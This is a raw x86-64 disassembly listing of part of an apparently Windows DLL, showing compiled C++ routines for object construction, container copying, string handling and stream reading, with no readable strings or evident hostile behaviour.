   180002bc9:	cc                   	int3
   180002bca:	cc                   	int3
   180002bcb:	cc                   	int3
   180002bcc:	cc                   	int3
   180002bcd:	cc                   	int3
   180002bce:	cc                   	int3
   180002bcf:	cc                   	int3
   180002bd0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180002bd5:	57                   	push   %rdi
   180002bd6:	48 83 ec 20          	sub    $0x20,%rsp
   180002bda:	8b da                	mov    %edx,%ebx
   180002bdc:	48 8b f9             	mov    %rcx,%rdi
   180002bdf:	48 8d 05 3a 1b 03 00 	lea    0x31b3a(%rip),%rax        # 0x180034720
   180002be6:	48 89 01             	mov    %rax,(%rcx)
   180002be9:	e8 3e b0 00 00       	call   0x18000dc2c
   180002bee:	90                   	nop
   180002bef:	f6 c3 01             	test   $0x1,%bl
   180002bf2:	74 0d                	je     0x180002c01
   180002bf4:	ba 48 00 00 00       	mov    $0x48,%edx
   180002bf9:	48 8b cf             	mov    %rdi,%rcx
   180002bfc:	e8 8b 9c 00 00       	call   0x18000c88c
   180002c01:	48 8b c7             	mov    %rdi,%rax
   180002c04:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180002c09:	48 83 c4 20          	add    $0x20,%rsp
   180002c0d:	5f                   	pop    %rdi
   180002c0e:	c3                   	ret
   180002c0f:	cc                   	int3
   180002c10:	48 83 ec 28          	sub    $0x28,%rsp
   180002c14:	48 8d 0d 35 ff 03 00 	lea    0x3ff35(%rip),%rcx        # 0x180042b50
   180002c1b:	e8 b4 aa 00 00       	call   0x18000d6d4
   180002c20:	cc                   	int3
   180002c21:	cc                   	int3
   180002c22:	cc                   	int3
   180002c23:	cc                   	int3
   180002c24:	cc                   	int3
   180002c25:	cc                   	int3
   180002c26:	cc                   	int3
   180002c27:	cc                   	int3
   180002c28:	cc                   	int3
   180002c29:	cc                   	int3
   180002c2a:	cc                   	int3
   180002c2b:	cc                   	int3
   180002c2c:	cc                   	int3
   180002c2d:	cc                   	int3
   180002c2e:	cc                   	int3
   180002c2f:	cc                   	int3
   180002c30:	40 53                	rex push %rbx
   180002c32:	48 83 ec 20          	sub    $0x20,%rsp
   180002c36:	48 8b d9             	mov    %rcx,%rbx
   180002c39:	48 8b c2             	mov    %rdx,%rax
   180002c3c:	48 8d 0d cd 18 03 00 	lea    0x318cd(%rip),%rcx        # 0x180034510
   180002c43:	0f 57 c0             	xorps  %xmm0,%xmm0
   180002c46:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   180002c4a:	48 89 0b             	mov    %rcx,(%rbx)
   180002c4d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   180002c51:	0f 11 02             	movups %xmm0,(%rdx)
   180002c54:	e8 7f c8 00 00       	call   0x18000f4d8
   180002c59:	48 8d 05 68 19 03 00 	lea    0x31968(%rip),%rax        # 0x1800345c8
   180002c60:	48 89 03             	mov    %rax,(%rbx)
   180002c63:	48 8b c3             	mov    %rbx,%rax
   180002c66:	48 83 c4 20          	add    $0x20,%rsp
   180002c6a:	5b                   	pop    %rbx
   180002c6b:	c3                   	ret
   180002c6c:	cc                   	int3
   180002c6d:	cc                   	int3
   180002c6e:	cc                   	int3
   180002c6f:	cc                   	int3
   180002c70:	40 53                	rex push %rbx
   180002c72:	48 83 ec 20          	sub    $0x20,%rsp
   180002c76:	8b 11                	mov    (%rcx),%edx
   180002c78:	83 ea 03             	sub    $0x3,%edx
   180002c7b:	74 6f                	je     0x180002cec
   180002c7d:	83 ea 01             	sub    $0x1,%edx
   180002c80:	74 47                	je     0x180002cc9
   180002c82:	83 fa 01             	cmp    $0x1,%edx
   180002c85:	0f 85 c5 00 00 00    	jne    0x180002d50
   180002c8b:	48 8b 59 08          	mov    0x8(%rcx),%rbx
   180002c8f:	48 85 db             	test   %rbx,%rbx
   180002c92:	0f 84 b8 00 00 00    	je     0x180002d50
   180002c98:	4c 8b 03             	mov    (%rbx),%r8
   180002c9b:	48 8b d3             	mov    %rbx,%rdx
   180002c9e:	48 8b cb             	mov    %rbx,%rcx
   180002ca1:	4d 8b 40 08          	mov    0x8(%r8),%r8
   180002ca5:	e8 d6 7c 00 00       	call   0x18000a980
   180002caa:	48 8b 0b             	mov    (%rbx),%rcx
   180002cad:	ba 50 00 00 00       	mov    $0x50,%edx
   180002cb2:	e8 d5 9b 00 00       	call   0x18000c88c
   180002cb7:	ba 10 00 00 00       	mov    $0x10,%edx
   180002cbc:	48 8b cb             	mov    %rbx,%rcx
   180002cbf:	48 83 c4 20          	add    $0x20,%rsp
   180002cc3:	5b                   	pop    %rbx
   180002cc4:	e9 c3 9b 00 00       	jmp    0x18000c88c
   180002cc9:	48 8b 59 08          	mov    0x8(%rcx),%rbx
   180002ccd:	48 85 db             	test   %rbx,%rbx
   180002cd0:	74 7e                	je     0x180002d50
   180002cd2:	48 8b cb             	mov    %rbx,%rcx
   180002cd5:	e8 26 5f 00 00       	call   0x180008c00
   180002cda:	ba 18 00 00 00       	mov    $0x18,%edx
   180002cdf:	48 8b cb             	mov    %rbx,%rcx
   180002ce2:	48 83 c4 20          	add    $0x20,%rsp
   180002ce6:	5b                   	pop    %rbx
   180002ce7:	e9 a0 9b 00 00       	jmp    0x18000c88c
   180002cec:	48 8b 59 08          	mov    0x8(%rcx),%rbx
   180002cf0:	48 85 db             	test   %rbx,%rbx
   180002cf3:	74 5b                	je     0x180002d50
   180002cf5:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   180002cf9:	48 83 fa 10          	cmp    $0x10,%rdx
   180002cfd:	72 2c                	jb     0x180002d2b
   180002cff:	48 8b 0b             	mov    (%rbx),%rcx
   180002d02:	48 ff c2             	inc    %rdx
   180002d05:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180002d0c:	72 18                	jb     0x180002d26
   180002d0e:	4c 8b 41 f8          	mov    -0x8(%rcx),%r8
   180002d12:	48 83 c2 27          	add    $0x27,%rdx
   180002d16:	49 2b c8             	sub    %r8,%rcx
   180002d19:	48 8d 41 f8          	lea    -0x8(%rcx),%rax
   180002d1d:	48 83 f8 1f          	cmp    $0x1f,%rax
   180002d21:	77 33                	ja     0x180002d56
   180002d23:	49 8b c8             	mov    %r8,%rcx
   180002d26:	e8 61 9b 00 00       	call   0x18000c88c
   180002d2b:	ba 20 00 00 00       	mov    $0x20,%edx
   180002d30:	48 c7 43 10 00 00 00 	movq   $0x0,0x10(%rbx)
   180002d37:	00 
   180002d38:	48 8b cb             	mov    %rbx,%rcx
   180002d3b:	48 c7 43 18 0f 00 00 	movq   $0xf,0x18(%rbx)
   180002d42:	00 
   180002d43:	c6 03 00             	movb   $0x0,(%rbx)
   180002d46:	48 83 c4 20          	add    $0x20,%rsp
   180002d4a:	5b                   	pop    %rbx
   180002d4b:	e9 3c 9b 00 00       	jmp    0x18000c88c
   180002d50:	48 83 c4 20          	add    $0x20,%rsp
   180002d54:	5b                   	pop    %rbx
   180002d55:	c3                   	ret
   180002d56:	e8 25 7e 01 00       	call   0x18001ab80
   180002d5b:	cc                   	int3
   180002d5c:	cc                   	int3
   180002d5d:	cc                   	int3
   180002d5e:	cc                   	int3
   180002d5f:	cc                   	int3
   180002d60:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   180002d65:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   180002d6a:	56                   	push   %rsi
   180002d6b:	57                   	push   %rdi
   180002d6c:	41 56                	push   %r14
   180002d6e:	48 83 ec 60          	sub    $0x60,%rsp
   180002d72:	48 8b 05 97 62 04 00 	mov    0x46297(%rip),%rax        # 0x180049010
   180002d79:	48 33 c4             	xor    %rsp,%rax
   180002d7c:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   180002d81:	48 8b da             	mov    %rdx,%rbx
   180002d84:	4c 8b f1             	mov    %rcx,%r14
   180002d87:	8b 0a                	mov    (%rdx),%ecx
   180002d89:	41 89 0e             	mov    %ecx,(%r14)
   180002d8c:	83 e9 03             	sub    $0x3,%ecx
   180002d8f:	0f 84 f2 01 00 00    	je     0x180002f87
   180002d95:	83 e9 01             	sub    $0x1,%ecx
   180002d98:	0f 84 e8 00 00 00    	je     0x180002e86
   180002d9e:	83 f9 01             	cmp    $0x1,%ecx
   180002da1:	74 09                	je     0x180002dac
   180002da3:	48 8b 42 08          	mov    0x8(%rdx),%rax
   180002da7:	e9 f7 01 00 00       	jmp    0x180002fa3
   180002dac:	b9 10 00 00 00       	mov    $0x10,%ecx
   180002db1:	e8 de 9a 00 00       	call   0x18000c894
   180002db6:	48 8b f8             	mov    %rax,%rdi
   180002db9:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   180002dbe:	0f 57 c0             	xorps  %xmm0,%xmm0
   180002dc1:	0f 11 00             	movups %xmm0,(%rax)
   180002dc4:	48 8b 5b 08          	mov    0x8(%rbx),%rbx
   180002dc8:	33 c9                	xor    %ecx,%ecx
   180002dca:	48 89 08             	mov    %rcx,(%rax)
   180002dcd:	48 89 48 08          	mov    %rcx,0x8(%rax)
   180002dd1:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   180002dd6:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   180002ddb:	b9 50 00 00 00       	mov    $0x50,%ecx
   180002de0:	e8 af 9a 00 00       	call   0x18000c894
   180002de5:	48 89 00             	mov    %rax,(%rax)
   180002de8:	48 89 40 08          	mov    %rax,0x8(%rax)
   180002dec:	48 89 40 10          	mov    %rax,0x10(%rax)
   180002df0:	66 c7 40 18 01 01    	movw   $0x101,0x18(%rax)
   180002df6:	48 89 07             	mov    %rax,(%rdi)
   180002df9:	48 8b 13             	mov    (%rbx),%rdx
   180002dfc:	44 0f b6 4c 24 20    	movzbl 0x20(%rsp),%r9d
   180002e02:	4c 8b c0             	mov    %rax,%r8
   180002e05:	48 8b 52 08          	mov    0x8(%rdx),%rdx
   180002e09:	48 8b cf             	mov    %rdi,%rcx
   180002e0c:	e8 5f 87 00 00       	call   0x18000b570
   180002e11:	48 8b c8             	mov    %rax,%rcx
   180002e14:	48 8b 07             	mov    (%rdi),%rax
   180002e17:	48 89 48 08          	mov    %rcx,0x8(%rax)
   180002e1b:	48 8b 43 08          	mov    0x8(%rbx),%rax
   180002e1f:	48 89 47 08          	mov    %rax,0x8(%rdi)
   180002e23:	48 8b 17             	mov    (%rdi),%rdx
   180002e26:	48 8b 4a 08          	mov    0x8(%rdx),%rcx
   180002e2a:	80 79 19 00          	cmpb   $0x0,0x19(%rcx)
   180002e2e:	75 43                	jne    0x180002e73
   180002e30:	48 8b 01             	mov    (%rcx),%rax
   180002e33:	80 78 19 00          	cmpb   $0x0,0x19(%rax)
   180002e37:	75 13                	jne    0x180002e4c
   180002e39:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   180002e40:	48 8b c8             	mov    %rax,%rcx
   180002e43:	48 8b 00             	mov    (%rax),%rax
   180002e46:	80 78 19 00          	cmpb   $0x0,0x19(%rax)
   180002e4a:	74 f4                	je     0x180002e40
   180002e4c:	48 89 0a             	mov    %rcx,(%rdx)
   180002e4f:	48 8b 17             	mov    (%rdi),%rdx
   180002e52:	48 8b 4a 08          	mov    0x8(%rdx),%rcx
   180002e56:	48 8b 41 10          	mov    0x10(%rcx),%rax
   180002e5a:	80 78 19 00          	cmpb   $0x0,0x19(%rax)
   180002e5e:	75 0d                	jne    0x180002e6d
   180002e60:	48 8b c8             	mov    %rax,%rcx
   180002e63:	48 8b 40 10          	mov    0x10(%rax),%rax
   180002e67:	80 78 19 00          	cmpb   $0x0,0x19(%rax)
   180002e6b:	74 f3                	je     0x180002e60
   180002e6d:	48 89 4a 10          	mov    %rcx,0x10(%rdx)
   180002e71:	eb 0a                	jmp    0x180002e7d
   180002e73:	48 89 12             	mov    %rdx,(%rdx)
   180002e76:	48 8b 07             	mov    (%rdi),%rax
   180002e79:	48 89 40 10          	mov    %rax,0x10(%rax)
   180002e7d:	49 89 7e 08          	mov    %rdi,0x8(%r14)
   180002e81:	e9 21 01 00 00       	jmp    0x180002fa7
   180002e86:	b9 18 00 00 00       	mov    $0x18,%ecx
   180002e8b:	e8 04 9a 00 00       	call   0x18000c894
   180002e90:	48 8b f0             	mov    %rax,%rsi
   180002e93:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   180002e98:	0f 57 c0             	xorps  %xmm0,%xmm0
   180002e9b:	33 c0                	xor    %eax,%eax
   180002e9d:	0f 11 06             	movups %xmm0,(%rsi)
   180002ea0:	48 89 46 10          	mov    %rax,0x10(%rsi)
   180002ea4:	48 8b 43 08          	mov    0x8(%rbx),%rax
   180002ea8:	33 c9                	xor    %ecx,%ecx
   180002eaa:	48 89 0e             	mov    %rcx,(%rsi)
   180002ead:	48 89 4e 08          	mov    %rcx,0x8(%rsi)
   180002eb1:	48 89 4e 10          	mov    %rcx,0x10(%rsi)
   180002eb5:	48 8b 38             	mov    (%rax),%rdi
   180002eb8:	48 8b 68 08          	mov    0x8(%rax),%rbp
   180002ebc:	48 3b fd             	cmp    %rbp,%rdi
   180002ebf:	0f 84 bc 00 00 00    	je     0x180002f81
   180002ec5:	48 8b dd             	mov    %rbp,%rbx
   180002ec8:	48 2b df             	sub    %rdi,%rbx
   180002ecb:	48 c1 fb 04          	sar    $0x4,%rbx
   180002ecf:	48 b8 ff ff ff ff ff 	movabs $0xfffffffffffffff,%rax
   180002ed6:	ff ff 0f 
   180002ed9:	48 3b d8             	cmp    %rax,%rbx
   180002edc:	0f 87 ea 00 00 00    	ja     0x180002fcc
   180002ee2:	48 c1 e3 04          	shl    $0x4,%rbx
   180002ee6:	48 81 fb 00 10 00 00 	cmp    $0x1000,%rbx
   180002eed:	72 29                	jb     0x180002f18
   180002eef:	48 8d 4b 27          	lea    0x27(%rbx),%rcx
   180002ef3:	48 3b cb             	cmp    %rbx,%rcx
   180002ef6:	0f 86 d0 00 00 00    	jbe    0x180002fcc
   180002efc:	e8 93 99 00 00       	call   0x18000c894
   180002f01:	48 85 c0             	test   %rax,%rax
   180002f04:	0f 84 c8 00 00 00    	je     0x180002fd2
   180002f0a:	48 8d 48 27          	lea    0x27(%rax),%rcx
   180002f0e:	48 83 e1 e0          	and    $0xffffffffffffffe0,%rcx
   180002f12:	48 89 41 f8          	mov    %rax,-0x8(%rcx)
   180002f16:	eb 10                	jmp    0x180002f28
   180002f18:	48 85 db             	test   %rbx,%rbx
   180002f1b:	74 0b                	je     0x180002f28
   180002f1d:	48 8b cb             	mov    %rbx,%rcx
   180002f20:	e8 6f 99 00 00       	call   0x18000c894
   180002f25:	48 8b c8             	mov    %rax,%rcx
   180002f28:	48 89 0e             	mov    %rcx,(%rsi)
   180002f2b:	48 89 4e 08          	mov    %rcx,0x8(%rsi)
   180002f2f:	48 8d 04 0b          	lea    (%rbx,%rcx,1),%rax
   180002f33:	48 89 46 10          	mov    %rax,0x10(%rsi)
   180002f37:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   180002f3c:	48 8b 1e             	mov    (%rsi),%rbx
   180002f3f:	0f 57 c0             	xorps  %xmm0,%xmm0
   180002f42:	0f 11 44 24 40       	movups %xmm0,0x40(%rsp)
   180002f47:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   180002f4c:	48 89 5c 24 48       	mov    %rbx,0x48(%rsp)
   180002f51:	48 89 74 24 50       	mov    %rsi,0x50(%rsp)
   180002f56:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   180002f5d:	00 00 00 
   180002f60:	48 8b d7             	mov    %rdi,%rdx
   180002f63:	48 8b cb             	mov    %rbx,%rcx
   180002f66:	e8 f5 fd ff ff       	call   0x180002d60
   180002f6b:	48 83 c3 10          	add    $0x10,%rbx
   180002f6f:	48 89 5c 24 48       	mov    %rbx,0x48(%rsp)
   180002f74:	48 83 c7 10          	add    $0x10,%rdi
   180002f78:	48 3b fd             	cmp    %rbp,%rdi
   180002f7b:	75 e3                	jne    0x180002f60
   180002f7d:	48 89 5e 08          	mov    %rbx,0x8(%rsi)
   180002f81:	49 89 76 08          	mov    %rsi,0x8(%r14)
   180002f85:	eb 20                	jmp    0x180002fa7
   180002f87:	b9 20 00 00 00       	mov    $0x20,%ecx
   180002f8c:	e8 03 99 00 00       	call   0x18000c894
   180002f91:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   180002f96:	48 8b 53 08          	mov    0x8(%rbx),%rdx
   180002f9a:	48 8b c8             	mov    %rax,%rcx
   180002f9d:	e8 9e 52 00 00       	call   0x180008240
   180002fa2:	90                   	nop
   180002fa3:	49 89 46 08          	mov    %rax,0x8(%r14)
   180002fa7:	49 8b c6             	mov    %r14,%rax
   180002faa:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   180002faf:	48 33 cc             	xor    %rsp,%rcx
   180002fb2:	e8 19 96 00 00       	call   0x18000c5d0
   180002fb7:	4c 8d 5c 24 60       	lea    0x60(%rsp),%r11
   180002fbc:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   180002fc0:	49 8b 6b 38          	mov    0x38(%r11),%rbp
   180002fc4:	49 8b e3             	mov    %r11,%rsp
   180002fc7:	41 5e                	pop    %r14
   180002fc9:	5f                   	pop    %rdi
   180002fca:	5e                   	pop    %rsi
   180002fcb:	c3                   	ret
   180002fcc:	e8 4f f0 ff ff       	call   0x180002020
   180002fd1:	90                   	nop
   180002fd2:	e8 a9 7b 01 00       	call   0x18001ab80
   180002fd7:	cc                   	int3
   180002fd8:	cc                   	int3
   180002fd9:	cc                   	int3
   180002fda:	cc                   	int3
   180002fdb:	cc                   	int3
   180002fdc:	cc                   	int3
   180002fdd:	cc                   	int3
   180002fde:	cc                   	int3
   180002fdf:	cc                   	int3
   180002fe0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180002fe5:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   180002fea:	55                   	push   %rbp
   180002feb:	48 8d 6c 24 a9       	lea    -0x57(%rsp),%rbp
   180002ff0:	48 81 ec e0 00 00 00 	sub    $0xe0,%rsp
   180002ff7:	48 8b 05 12 60 04 00 	mov    0x46012(%rip),%rax        # 0x180049010
   180002ffe:	48 33 c4             	xor    %rsp,%rax
   180003001:	48 89 45 47          	mov    %rax,0x47(%rbp)
   180003005:	48 8b d9             	mov    %rcx,%rbx
   180003008:	48 89 4d bf          	mov    %rcx,-0x41(%rbp)
   18000300c:	45 33 c9             	xor    %r9d,%r9d
   18000300f:	44 89 4d 97          	mov    %r9d,-0x69(%rbp)
   180003013:	4c 89 09             	mov    %r9,(%rcx)
   180003016:	4c 89 49 10          	mov    %r9,0x10(%rcx)
   18000301a:	48 c7 41 18 0f 00 00 	movq   $0xf,0x18(%rcx)
   180003021:	00 
   180003022:	44 88 09             	mov    %r9b,(%rcx)
   180003025:	c7 45 97 01 00 00 00 	movl   $0x1,-0x69(%rbp)
   18000302c:	4c 89 4d af          	mov    %r9,-0x51(%rbp)
   180003030:	66 c7 45 b7 01 00    	movw   $0x1,-0x49(%rbp)
   180003036:	49 8b 00             	mov    (%r8),%rax
   180003039:	48 63 48 04          	movslq 0x4(%rax),%rcx
   18000303d:	4a 8b 44 01 48       	mov    0x48(%rcx,%r8,1),%rax
   180003042:	48 89 45 9f          	mov    %rax,-0x61(%rbp)
   180003046:	48 85 c0             	test   %rax,%rax
   180003049:	0f 94 45 a7          	sete   -0x59(%rbp)
   18000304d:	44 88 4d a8          	mov    %r9b,-0x58(%rbp)
   180003051:	48 89 55 c7          	mov    %rdx,-0x39(%rbp)
   180003055:	66 44 89 4d f4       	mov    %r9w,-0xc(%rbp)
   18000305a:	44 88 4d f6          	mov    %r9b,-0xa(%rbp)
   18000305e:	48 c7 45 f7 01 00 00 	movq   $0x1,-0x9(%rbp)
   180003065:	00 
   180003066:	0f 10 45 9f          	movups -0x61(%rbp),%xmm0
   18000306a:	0f 11 45 cf          	movups %xmm0,-0x31(%rbp)
   18000306e:	0f 10 4d af          	movups -0x51(%rbp),%xmm1
   180003072:	0f 11 4d df          	movups %xmm1,-0x21(%rbp)
   180003076:	48 c7 c7 ff ff ff ff 	mov    $0xffffffffffffffff,%rdi
   18000307d:	89 7d ef             	mov    %edi,-0x11(%rbp)
   180003080:	44 88 4d f3          	mov    %r9b,-0xd(%rbp)
   180003084:	48 8d 55 cf          	lea    -0x31(%rbp),%rdx
   180003088:	48 8d 4d c7          	lea    -0x39(%rbp),%rcx
   18000308c:	e8 ef 7b 00 00       	call   0x18000ac80
   180003091:	84 c0                	test   %al,%al
   180003093:	0f 85 96 00 00 00    	jne    0x18000312f
   180003099:	44 8b 4d f7          	mov    -0x9(%rbp),%r9d
   18000309d:	4c 8d 05 2c 00 04 00 	lea    0x4002c(%rip),%r8        # 0x1800430d0
   1800030a4:	8d 57 41             	lea    0x41(%rdi),%edx
   1800030a7:	48 8d 4d 07          	lea    0x7(%rbp),%rcx
   1800030ab:	e8 60 7b 00 00       	call   0x18000ac10
   1800030b0:	48 8d 45 07          	lea    0x7(%rbp),%rax
   1800030b4:	48 ff c7             	inc    %rdi
   1800030b7:	80 3c 38 00          	cmpb   $0x0,(%rax,%rdi,1)
   1800030bb:	75 f7                	jne    0x1800030b4
   1800030bd:	4c 8b c7             	mov    %rdi,%r8
   1800030c0:	48 8d 55 07          	lea    0x7(%rbp),%rdx
   1800030c4:	48 8b cb             	mov    %rbx,%rcx
   1800030c7:	e8 c4 5b 00 00       	call   0x180008c90
   1800030cc:	48 8d 4d cf          	lea    -0x31(%rbp),%rcx
   1800030d0:	e8 ab 79 00 00       	call   0x18000aa80
   1800030d5:	83 f8 ff             	cmp    $0xffffffff,%eax
   1800030d8:	74 55                	je     0x18000312f
   1800030da:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1800030e0:	83 f8 0a             	cmp    $0xa,%eax
   1800030e3:	74 4a                	je     0x18000312f
   1800030e5:	83 f8 20             	cmp    $0x20,%eax
   1800030e8:	7c 37                	jl     0x180003121
   1800030ea:	48 8b 53 10          	mov    0x10(%rbx),%rdx
   1800030ee:	4c 8b 43 18          	mov    0x18(%rbx),%r8
   1800030f2:	49 3b d0             	cmp    %r8,%rdx
   1800030f5:	73 1e                	jae    0x180003115
   1800030f7:	48 8d 4a 01          	lea    0x1(%rdx),%rcx
   1800030fb:	48 89 4b 10          	mov    %rcx,0x10(%rbx)
   1800030ff:	48 8b cb             	mov    %rbx,%rcx
   180003102:	49 83 f8 10          	cmp    $0x10,%r8
   180003106:	72 03                	jb     0x18000310b
   180003108:	48 8b 0b             	mov    (%rbx),%rcx
   18000310b:	88 04 11             	mov    %al,(%rcx,%rdx,1)
   18000310e:	c6 44 11 01 00       	movb   $0x0,0x1(%rcx,%rdx,1)
   180003113:	eb 0c                	jmp    0x180003121
   180003115:	44 0f b6 c8          	movzbl %al,%r9d
   180003119:	48 8b cb             	mov    %rbx,%rcx
   18000311c:	e8 df 69 00 00       	call   0x180009b00
   180003121:	48 8d 4d cf          	lea    -0x31(%rbp),%rcx
   180003125:	e8 56 79 00 00       	call   0x18000aa80
   18000312a:	83 f8 ff             	cmp    $0xffffffff,%eax
   18000312d:	75 b1                	jne    0x1800030e0
   18000312f:	48 8b c3             	mov    %rbx,%rax
   180003132:	48 8b 4d 47          	mov    0x47(%rbp),%rcx
   180003136:	48 33 cc             	xor    %rsp,%rcx
   180003139:	e8 92 94 00 00       	call   0x18000c5d0
   18000313e:	4c 8d 9c 24 e0 00 00 	lea    0xe0(%rsp),%r11
   180003145:	00 
   180003146:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   18000314a:	49 8b 7b 20          	mov    0x20(%r11),%rdi
   18000314e:	49 8b e3             	mov    %r11,%rsp
   180003151:	5d                   	pop    %rbp
   180003152:	c3                   	ret
   180003153:	cc                   	int3
   180003154:	cc                   	int3
   180003155:	cc                   	int3
   180003156:	cc                   	int3
   180003157:	cc                   	int3
   180003158:	cc                   	int3
   180003159:	cc                   	int3
   18000315a:	cc                   	int3
   18000315b:	cc                   	int3
   18000315c:	cc                   	int3
   18000315d:	cc                   	int3
   18000315e:	cc                   	int3
   18000315f:	cc                   	int3
   180003160:	33 c0                	xor    %eax,%eax
   180003162:	c3                   	ret
   180003163:	cc                   	int3
   180003164:	cc                   	int3
   180003165:	cc                   	int3
   180003166:	cc                   	int3
   180003167:	cc                   	int3
   180003168:	cc                   	int3
   180003169:	cc                   	int3
   18000316a:	cc                   	int3
   18000316b:	cc                   	int3
   18000316c:	cc                   	int3
   18000316d:	cc                   	int3
   18000316e:	cc                   	int3
   18000316f:	cc                   	int3
   180003170:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180003175:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   18000317a:	55                   	push   %rbp
   18000317b:	57                   	push   %rdi
   18000317c:	41 56                	push   %r14
   18000317e:	48 8d ac 24 60 f0 ff 	lea    -0xfa0(%rsp),%rbp
   180003185:	ff 
   180003186:	b8 a0 10 00 00       	mov    $0x10a0,%eax
   18000318b:	e8 20 ec 02 00       	call   0x180031db0
   180003190:	48 2b e0             	sub    %rax,%rsp
   180003193:	48 8b 05 76 5e 04 00 	mov    0x45e76(%rip),%rax        # 0x180049010
   18000319a:	48 33 c4             	xor    %rsp,%rax
   18000319d:	48 89 85 90 0f 00 00 	mov    %rax,0xf90(%rbp)
   1800031a4:	48 8b d9             	mov    %rcx,%rbx
   1800031a7:	48 89 4c 24 60       	mov    %rcx,0x60(%rsp)
   1800031ac:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   1800031b2:	48 8d 55 90          	lea    -0x70(%rbp),%rdx
   1800031b6:	48 8d 0d 1f fb 03 00 	lea    0x3fb1f(%rip),%rcx        # 0x180042cdc
   1800031bd:	ff 15 1d 0f 03 00    	call   *0x30f1d(%rip)        # 0x1800340e0
   1800031c3:	45 33 f6             	xor    %r14d,%r14d
   1800031c6:	4c 89 74 24 68       	mov    %r14,0x68(%rsp)
   1800031cb:	4c 89 74 24 78       	mov    %r14,0x78(%rsp)
   1800031d0:	48 c7 45 80 0f 00 00 	movq   $0xf,-0x80(%rbp)
   1800031d7:	00 
   1800031d8:	44 88 74 24 68       	mov    %r14b,0x68(%rsp)
   1800031dd:	48 8d 45 90          	lea    -0x70(%rbp),%rax
   1800031e1:	49 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%r8
   1800031e8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1800031ef:	00 
   1800031f0:	49 ff c0             	inc    %r8
   1800031f3:	46 38 34 00          	cmp    %r14b,(%rax,%r8,1)
   1800031f7:	75 f7                	jne    0x1800031f0
   1800031f9:	48 8d 55 90          	lea    -0x70(%rbp),%rdx
   1800031fd:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   180003202:	e8 89 5a 00 00       	call   0x180008c90
   180003207:	90                   	nop
   180003208:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   18000320c:	48 bf ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rdi
   180003213:	ff ff 7f 
   180003216:	48 8b c7             	mov    %rdi,%rax
   180003219:	48 2b c1             	sub    %rcx,%rax
   18000321c:	48 83 f8 01          	cmp    $0x1,%rax
   180003220:	0f 82 97 03 00 00    	jb     0x1800035bd
   180003226:	48 8b c3             	mov    %rbx,%rax
   180003229:	48 83 7b 18 10       	cmpq   $0x10,0x18(%rbx)
   18000322e:	72 03                	jb     0x180003233
   180003230:	48 8b 03             	mov    (%rbx),%rax
   180003233:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   180003238:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   18000323d:	be 01 00 00 00       	mov    $0x1,%esi
   180003242:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   180003247:	4c 8d 0d 96 fa 03 00 	lea    0x3fa96(%rip),%r9        # 0x180042ce4
   18000324e:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   180003253:	e8 68 73 00 00       	call   0x18000a5c0
   180003258:	90                   	nop
   180003259:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   18000325e:	48 83 7c 24 58 10    	cmpq   $0x10,0x58(%rsp)
   180003264:	48 0f 43 54 24 40    	cmovae 0x40(%rsp),%rdx
   18000326a:	4c 8b 44 24 50       	mov    0x50(%rsp),%r8
   18000326f:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   180003274:	e8 77 5b 00 00       	call   0x180008df0
   180003279:	90                   	nop
   18000327a:	48 8b 54 24 58       	mov    0x58(%rsp),%rdx
   18000327f:	48 83 fa 10          	cmp    $0x10,%rdx
   180003283:	72 32                	jb     0x1800032b7
   180003285:	48 ff c2             	inc    %rdx
   180003288:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   18000328d:	48 8b c1             	mov    %rcx,%rax
   180003290:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180003297:	72 19                	jb     0x1800032b2
   180003299:	48 83 c2 27          	add    $0x27,%rdx
   18000329d:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   1800032a1:	48 2b c1             	sub    %rcx,%rax
   1800032a4:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   1800032a8:	48 83 f8 1f          	cmp    $0x1f,%rax
   1800032ac:	0f 87 11 03 00 00    	ja     0x1800035c3
   1800032b2:	e8 d5 95 00 00       	call   0x18000c88c
   1800032b7:	48 8d 54 24 68       	lea    0x68(%rsp),%rdx
   1800032bc:	48 83 7d 80 10       	cmpq   $0x10,-0x80(%rbp)
   1800032c1:	48 0f 43 54 24 68    	cmovae 0x68(%rsp),%rdx
   1800032c7:	48 8d 0d 0e fa 03 00 	lea    0x3fa0e(%rip),%rcx        # 0x180042cdc
